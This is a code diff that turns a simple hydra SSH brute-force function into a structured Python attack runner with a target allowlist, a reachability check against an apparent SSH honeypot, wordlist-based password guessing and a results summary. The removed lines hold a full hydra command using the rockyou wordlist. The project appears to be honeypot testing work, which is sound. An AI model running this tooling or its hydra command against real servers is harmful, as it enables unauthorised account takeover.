@@ -1,16 +1,105 @@
-import subprocess
+from __future__ import annotations
+
+import logging
+import time
+from dataclasses import dataclass, field
+from pathlib import Path
+
+from attacker.attacks.common import (
+    ResultsDir,
+    ensure_allowed,
+    is_reachable,
+    make_results_dir,
+    resolve_password_wordlist,
+    resolve_username_wordlist,
+    run_hydra,
+)
+
+logger = logging.getLogger(__name__)
 
 
-def bruteforce_ssh(target: str, user: str, port: str = "22"):
-    wordlist = "../wordlist/rockyou.txt"
+@dataclass(frozen=True)
+class SshBruteforceConfig:
+    target_host: str
+    target_port: int = 2222
+    hydra_tasks: int = 4
+    hydra_timeout: int = 120
+    ssh_timeout: float = 8.0
+    pause_between_manual: float = 0.5
+    pause_before_assertions: float = 10.0
+    skip_hydra: bool = False
+    bypass_allowlist: bool = False
+    password_wordlist: Path | None = None
+    username_wordlist: Path | None = None
 
-    cmd = [
-        "hydra",
-        "-l", user,
-        "-P", wordlist,
-        "-t", "4",
-        "-s", port,
-        target, "ssh"
+
+@dataclass
+class SshBruteforceReport:
+    target: str
+    hydra_attempts: int = 0
+    hydra_credentials_found: int = 0
+    skipped_phases: list[str] = field(default_factory=list)
+    exit_code: int = 0
+
+
+def run(
+    config: SshBruteforceConfig,
+    reports_dir: Path,
+) -> SshBruteforceReport:
+    report = SshBruteforceReport(
+        target=f"ssh://{config.target_host}:{config.target_port}"
+    )
+
+    if not ensure_allowed(config.target_host, bypass=config.bypass_allowlist):
+        report.exit_code = 2
+        return report
+
+    results = make_results_dir(reports_dir, prefix="ssh")
+    logger.info("Artefacts directory: %s", results.path)
+
+    if not is_reachable(config.target_host, config.target_port):
+        logger.error(
+            "SSH honeypot unreachable at %s:%d", config.target_host, config.target_port
+        )
+        report.exit_code = 2
+        return report
+    logger.info("SSH honeypot reachable")
+
+    username_wordlist = resolve_username_wordlist(config.username_wordlist)
+    password_wordlist = resolve_password_wordlist(config.password_wordlist)
+
+    if config.skip_hydra:
+        report.skipped_phases.append("hydra")
+        logger.warning("Phase 1 skipped (--skip-hydra)")
+    elif password_wordlist is None:
+        logger.error("No password wordlist available; skipping hydra phase")
+        report.skipped_phases.append("hydra")
+    elif username_wordlist is None:
+        logger.error("No username wordlist available; skipping hydra phase")
+        report.skipped_phases.append("hydra")
+    else:
+        report.hydra_attempts, report.hydra_credentials_found = run_hydra(
+            "ssh",
+            config.target_host,
+            config.target_port,
+            config.hydra_tasks,
+            config.hydra_timeout,
+            username_wordlist,
+            password_wordlist,
+            results,
+        )
+
+    _write_summary(results, report)
+    return report
+
+
+def _write_summary(results: ResultsDir, report: SshBruteforceReport) -> None:
+    lines = [
+        f"target: {report.target}",
+        f"hydra_attempts: {report.hydra_attempts}",
+        f"hydra_credentials_found: {report.hydra_credentials_found}",
+        f"skipped_phases: {','.join(report.skipped_phases) or 'none'}",
+        f"exit_code: {report.exit_code}",
     ]
-    print(f"[*] {' '.join(cmd)}\n")
-    subprocess.run(cmd)
+
+    results.file("summary.txt").write_text("\n".join(lines), encoding="utf-8")
